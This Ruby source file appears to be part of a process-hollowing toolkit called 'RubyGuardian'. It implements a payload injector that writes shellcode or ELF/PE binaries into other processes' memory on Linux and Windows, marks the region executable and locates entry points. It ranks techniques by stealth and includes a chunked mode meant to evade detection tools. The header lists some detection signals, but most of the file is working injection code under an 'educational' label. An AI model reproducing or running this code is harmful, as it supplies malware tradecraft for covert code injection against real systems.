# frozen_string_literal: true

# =============================================================================
# RubyGuardian Phase 1a -- Payload Injector
#
# Handles the injection of payload data into a target process's memory space.
# Supports multiple injection techniques for both Linux and Windows platforms.
#
# EDUCATIONAL PURPOSE ONLY -- Authorized security research.
#
# MITRE ATT&CK: T1055.012 - Process Injection: Process Hollowing
#
# INJECTION TECHNIQUES:
#   1. process_vm_writev (Linux) - Direct cross-process memory write
#   2. /proc/<pid>/mem (Linux) - File-based memory write via procfs
#   3. ptrace POKEDATA (Linux) - Word-by-word memory write via ptrace
#   4. WriteProcessMemory (Windows) - Win32 API memory write
#
# DETECTION METHODS:
#   - Monitor process_vm_writev syscalls from non-debugger processes
#   - Watch for /proc/<pid>/mem opens by unexpected processes
#   - Track ptrace POKEDATA frequency spikes (bulk writes)
#   - Memory forensics: compare on-disk binary vs. loaded image
# =============================================================================

require_relative 'ffi_bindings/common_types'

module RubyGuardian
  module ProcessHollowing
    class PayloadInjector
      # Injection methods ranked by stealth and efficiency
      INJECTION_METHODS = {
        process_vm_writev: {
          platform: :linux,
          stealth: :medium,
          description: 'Bulk cross-process write via process_vm_writev syscall'
        },
        proc_mem: {
          platform: :linux,
          stealth: :low,
          description: 'Write via /proc/<pid>/mem file descriptor'
        },
        ptrace_poke: {
          platform: :linux,
          stealth: :high,
          description: 'Word-by-word write via ptrace POKEDATA'
        },
        write_process_memory: {
          platform: :windows,
          stealth: :medium,
          description: 'WriteProcessMemory Win32 API call'
        }
      }.freeze

      # Maximum payload size for safety (16 MB)
      MAX_PAYLOAD_SIZE = 16 * 1024 * 1024

      # Page size for alignment calculations
      PAGE_SIZE = 4096

      attr_reader :injection_log, :logger

      # @param logger [AttackLogger] Logger instance
      # @param method [Symbol] Preferred injection method (auto-detected if nil)
      def initialize(logger:, method: nil)
        @logger = logger
        @preferred_method = method
        @injection_log = []
      end

      # Inject payload into the target process's memory.
      #
      # EDUCATIONAL: The injection process involves:
      #   1. Validate the payload (size, format)
      #   2. Determine or allocate the target address
      #   3. Write the payload data into remote memory
      #   4. Set appropriate memory protections
      #   5. Verify the write was successful
      #
      # @param pid [Integer] Target process ID
      # @param payload [String] Raw payload bytes
      # @param target_info [Hash] Information about the target process
      # @param platform [Symbol] :linux or :windows
      # @return [Hash] Injection result with :address and :entry_point
      def inject(pid, payload, target_info:, platform:)
        validate_payload!(payload)

        @logger.info("Injecting #{payload.bytesize} bytes into PID #{pid}")

        method = select_method(platform)
        @logger.info("Using injection method: #{method}")

        # Determine the target address for injection
        target_address = determine_target_address(pid, payload.bytesize, target_info, platform)
        @logger.info("Target injection address: 0x#{target_address.to_s(16)}")

        # Perform the injection
        result = case method
                 when :process_vm_writev
                   inject_via_process_vm_writev(pid, target_address, payload)
                 when :proc_mem
                   inject_via_proc_mem(pid, target_address, payload)
                 when :ptrace_poke
                   inject_via_ptrace_poke(pid, target_address, payload)
                 when :write_process_memory
                   inject_via_write_process_memory(pid, target_address, payload, target_info)
                 end

        # Verify the injection
        verify_injection(pid, target_address, payload, platform) if result[:success]

        # Set memory protections (RX for code, RW for data)
        set_memory_protections(pid, target_address, payload.bytesize, platform)

        # Calculate the entry point
        entry_point = calculate_entry_point(target_address, payload)

        injection_record = {
          timestamp: Time.now.utc.iso8601,
          pid: pid,
          method: method,
          address: target_address,
          size: payload.bytesize,
          entry_point: entry_point,
          success: result[:success]
        }
        @injection_log << injection_record

        @logger.info("Injection complete: #{result[:bytes_written]} bytes written")
        { address: target_address, entry_point: entry_point, bytes_written: result[:bytes_written] }
      end

      # Inject a staged payload in multiple chunks.
      #
      # EDUCATIONAL: Staged injection writes the payload in small chunks
      # to avoid detection by tools that monitor for large single writes.
      # Each chunk is written with a small delay to mimic normal I/O patterns.
      #
      # @param pid [Integer] Target PID
      # @param payload [String] Raw payload bytes
      # @param chunk_size [Integer] Size of each chunk
      # @param target_info [Hash] Target process info
      # @param platform [Symbol] Platform identifier
      # @return [Hash] Injection result
      def inject_staged(pid, payload, chunk_size: 4096, target_info:, platform:)
        validate_payload!(payload)

        target_address = determine_target_address(pid, payload.bytesize, target_info, platform)
        @logger.info("Staged injection: #{payload.bytesize} bytes in " \
                     "#{(payload.bytesize.to_f / chunk_size).ceil} chunks")

        total_written = 0
        offset = 0

        while offset < payload.bytesize
          chunk = payload[offset, chunk_size]
          write_address = target_address + offset

          case platform
          when :linux
            bytes = FFIBindings::LinuxAPI.write_process_memory(pid, write_address, chunk)
          when :windows
            bytes = write_windows_memory(pid, write_address, chunk, target_info)
          end

          total_written += bytes
          offset += chunk.bytesize

          @logger.debug("Wrote chunk: offset=0x#{offset.to_s(16)}, " \
                        "size=#{chunk.bytesize}, total=#{total_written}")
        end

        entry_point = calculate_entry_point(target_address, payload)

        @logger.info("Staged injection complete: #{total_written} bytes in " \
                     "#{(payload.bytesize.to_f / chunk_size).ceil} chunks")

        { address: target_address, entry_point: entry_point, bytes_written: total_written }
      end

      # Prepare a payload with proper alignment and headers.
      #
      # EDUCATIONAL: When injecting a full ELF/PE binary (as opposed to
      # raw shellcode), we need to handle the binary format:
      #   - Parse the headers to find segment layout
      #   - Rebase addresses if loading at a different base
      #   - Process relocations
      #   - Set up the proper memory layout (code, data, bss sections)
      #
      # @param raw_payload [String] Raw binary data
      # @param base_address [Integer] Target base address
      # @return [Hash] Prepared payload with segments
      def prepare_payload(raw_payload, base_address:)
        # Check if this is an ELF binary
        if raw_payload[0..3] == FFIBindings::LinuxConstants::ELF_MAGIC
          prepare_elf_payload(raw_payload, base_address)
        elsif raw_payload[0..1].unpack1('v') == FFIBindings::WinConstants::IMAGE_DOS_SIGNATURE
          prepare_pe_payload(raw_payload, base_address)
        else
          # Treat as raw shellcode
          prepare_shellcode_payload(raw_payload, base_address)
        end
      end

      # Generate a report of all injection operations.
      #
      # @return [Array<Hash>] Injection history
      def injection_report
        @injection_log.map do |entry|
          entry.merge(
            method_info: INJECTION_METHODS[entry[:method]]
          )
        end
      end

      private

      # Validate payload before injection.
      def validate_payload!(payload)
        raise ArgumentError, 'Payload cannot be nil' if payload.nil?
        raise ArgumentError, 'Payload cannot be empty' if payload.empty?

        if payload.bytesize > MAX_PAYLOAD_SIZE
          raise ArgumentError, "Payload too large: #{payload.bytesize} bytes " \
                               "(max: #{MAX_PAYLOAD_SIZE})"
        end
      end

      # Select the appropriate injection method based on platform and configuration.
      def select_method(platform)
        if @preferred_method
          method_info = INJECTION_METHODS[@preferred_method]
          if method_info && method_info[:platform] == platform
            return @preferred_method
          end
          @logger.warn("Preferred method #{@preferred_method} not available, auto-selecting")
        end

        case platform
        when :linux  then :process_vm_writev
        when :windows then :write_process_memory
        else raise "No injection method available for platform: #{platform}"
        end
      end

      # Determine the target address for payload injection.
      #
      # EDUCATIONAL: The target address must be:
      #   - Page-aligned (multiple of 4096 on most architectures)
      #   - In a region that won't conflict with existing mappings
      #   - Within the addressable range of the target process
      #
      # @param pid [Integer] Target PID
      # @param size [Integer] Size of payload
      # @param target_info [Hash] Target process information
      # @param platform [Symbol] Platform identifier
      # @return [Integer] Target address
      def determine_target_address(pid, size, target_info, platform)
        # If the target was hollowed, use the original base address
        if target_info[:base_address]
          return target_info[:base_address]
        end

        # Otherwise, find a suitable gap in the memory layout
        if target_info[:memory_layout]
          find_memory_gap(target_info[:memory_layout], size)
        else
          # Default to a common base address for position-independent code
          case platform
          when :linux then 0x400000  # Standard ELF base
          when :windows then 0x00400000  # Standard PE base
          end
        end
      end

      # Find a gap in the target's memory map large enough for the payload.
      #
      # @param memory_layout [Array<Hash>] Parsed memory maps
      # @param size [Integer] Required size
      # @return [Integer] Start address of a suitable gap
      def find_memory_gap(memory_layout, size)
        aligned_size = align_up(size, PAGE_SIZE)
        sorted = memory_layout.sort_by { |m| m[:start_addr] }

        sorted.each_cons(2) do |current, next_region|
          gap_start = align_up(current[:end_addr], PAGE_SIZE)
          gap_size = next_region[:start_addr] - gap_start

          if gap_size >= aligned_size
            @logger.debug("Found memory gap: 0x#{gap_start.to_s(16)} " \
                          "(#{gap_size} bytes available, need #{aligned_size})")
            return gap_start
          end
        end

        # Fallback: use address after last region
        last = sorted.last
        align_up(last[:end_addr], PAGE_SIZE)
      end

      # Inject via process_vm_writev (Linux, most efficient).
      def inject_via_process_vm_writev(pid, address, payload)
        bytes = FFIBindings::LinuxAPI.write_process_memory(pid, address, payload)
        @logger.info("process_vm_writev: wrote #{bytes} bytes to 0x#{address.to_s(16)}")
        { success: bytes == payload.bytesize, bytes_written: bytes }
      end

      # Inject via /proc/<pid>/mem (Linux, file-based).
      #
      # EDUCATIONAL: /proc/<pid>/mem provides file-like access to a
      # process's address space. Writing to it at the correct offset
      # modifies the target's memory. This requires the writer to be
      # the tracer (via ptrace) or have CAP_SYS_PTRACE.
      def inject_via_proc_mem(pid, address, payload)
        mem_path = "/proc/#{pid}/mem"

        File.open(mem_path, 'r+b') do |mem_file|
          mem_file.seek(address)
          bytes_written = mem_file.write(payload)
          mem_file.flush

          @logger.info("/proc/#{pid}/mem: wrote #{bytes_written} bytes at offset 0x#{address.to_s(16)}")
          return { success: bytes_written == payload.bytesize, bytes_written: bytes_written }
        end
      rescue Errno::EACCES => e
        @logger.error("Cannot write to #{mem_path}: #{e.message}")
        @logger.error('Ensure ptrace is attached or CAP_SYS_PTRACE is held')
        { success: false, bytes_written: 0, error: e.message }
      end

      # Inject via ptrace POKEDATA (Linux, word-by-word).
      #
      # EDUCATIONAL: PTRACE_POKEDATA writes one word (8 bytes on x64) at
      # a time. This is slow for large payloads but doesn't require
      # process_vm_writev support. It's also harder to detect as a bulk
      # operation since each write looks like normal debugging activity.
      def inject_via_ptrace_poke(pid, address, payload)
        word_size = 8  # x86_64
        bytes_written = 0
        offset = 0

        while offset < payload.bytesize
          # Read a word-sized chunk from the payload
          chunk = payload[offset, word_size]
          # Pad to word size if needed (last chunk)
          chunk = chunk.ljust(word_size, "\0") if chunk.bytesize < word_size

          word_value = chunk.unpack1('Q<')
          FFIBindings::LinuxAPI.ptrace_pokedata(pid, address + offset, word_value)

          bytes_written += [word_size, payload.bytesize - offset].min
          offset += word_size
        end

        @logger.info("ptrace POKEDATA: wrote #{bytes_written} bytes in #{offset / word_size} words")
        { success: bytes_written >= payload.bytesize, bytes_written: bytes_written }
      end

      # Inject via WriteProcessMemory (Windows).
      def inject_via_write_process_memory(pid, address, payload, target_info)
        bytes = write_windows_memory(pid, address, payload, target_info)
        { success: bytes == payload.bytesize, bytes_written: bytes }
      end

      # Write memory on Windows using WriteProcessMemory.
      def write_windows_memory(_pid, address, data, target_info)
        handle = target_info[:process_handle]
        buf = FFI::MemoryPointer.from_string(data)
        written = FFI::MemoryPointer.new(:size_t)

        success = FFIBindings::Kernel32.WriteProcessMemory(
          handle,
          FFI::Pointer.new(:void, address),
          buf,
          data.bytesize,
          written
        )

        unless success
          raise "WriteProcessMemory failed: error #{FFIBindings::Kernel32.GetLastError}"
        end

        written.read_ulong
      end

      # Verify that the injection wrote correctly by reading back.
      def verify_injection(pid, address, payload, platform)
        sample_size = [64, payload.bytesize].min

        case platform
        when :linux
          readback = FFIBindings::LinuxAPI.read_process_memory(pid, address, sample_size)
          expected = payload[0, sample_size]

          if readback == expected
            @logger.info('Injection verification: PASSED (first 64 bytes match)')
          else
            @logger.warn('Injection verification: FAILED (data mismatch)')
            @logger.warn("Expected: #{expected.unpack1('H*')[0..31]}...")
            @logger.warn("Got:      #{readback.unpack1('H*')[0..31]}...")
          end
        when :windows
          @logger.info('Injection verification: skipped on Windows (ReadProcessMemory not yet implemented)')
        end
      end

      # Set memory protections on the injected region.
      #
      # EDUCATIONAL: After writing, we change the memory protection from
      # RW (needed for writing) to RX (needed for execution). Leaving
      # memory as RWX is a strong detection signal.
      def set_memory_protections(pid, address, size, platform)
        @logger.info("Setting memory protections for injection region at 0x#{address.to_s(16)}")

        case platform
        when :linux
          # On Linux with ptrace, we would inject a small mprotect shellcode
          # stub, or use the already-set permissions from mmap. For educational
          # purposes, we log what would be done.
          @logger.info("Would call mprotect(0x#{address.to_s(16)}, #{size}, PROT_READ|PROT_EXEC)")
        when :windows
          if @target_info[:process_handle]
            old_protect = FFI::MemoryPointer.new(:uint32)
            FFIBindings::Kernel32.VirtualProtectEx(
              @target_info[:process_handle],
              FFI::Pointer.new(:void, address),
              size,
              FFIBindings::WinConstants::PAGE_EXECUTE_READ,
              old_protect
            )
            @logger.info("VirtualProtectEx: changed to PAGE_EXECUTE_READ")
          end
        end
      end

      # Calculate the entry point for the payload.
      #
      # @param base_address [Integer] Where the payload was loaded
      # @param payload [String] The payload data
      # @return [Integer] Entry point address
      def calculate_entry_point(base_address, payload)
        # For ELF: read the entry point from the header
        if payload[0..3] == FFIBindings::LinuxConstants::ELF_MAGIC
          elf_entry = payload[24..31].unpack1('Q<')
          # Entry point is relative to base for PIE, absolute otherwise
          if elf_entry < base_address
            return base_address + elf_entry
          else
            return elf_entry
          end
        end

        # For PE: read from optional header
        if payload[0..1].unpack1('v') == FFIBindings::WinConstants::IMAGE_DOS_SIGNATURE
          e_lfanew = payload[60..63].unpack1('V')
          pe_entry = payload[e_lfanew + 40..e_lfanew + 43].unpack1('V')
          return base_address + pe_entry
        end

        # For raw shellcode: entry is the start of the buffer
        base_address
      end

      # Prepare an ELF binary for injection.
      def prepare_elf_payload(raw_payload, base_address)
        header = FFIBindings::LinuxAPI.parse_elf_header_from_data(raw_payload) rescue nil
        {
          type: :elf,
          base_address: base_address,
          data: raw_payload,
          entry_offset: header ? header[:entry_point] : 0
        }
      end

      # Prepare a PE binary for injection.
      def prepare_pe_payload(raw_payload, base_address)
        {
          type: :pe,
          base_address: base_address,
          data: raw_payload,
          entry_offset: 0  # Calculated during injection
        }
      end

      # Prepare raw shellcode for injection.
      def prepare_shellcode_payload(raw_payload, base_address)
        {
          type: :shellcode,
          base_address: base_address,
          data: raw_payload,
          entry_offset: 0  # Shellcode starts at byte 0
        }
      end

      # Align a value up to the given boundary.
      def align_up(value, alignment)
        (value + alignment - 1) & ~(alignment - 1)
      end
    end
  end
end
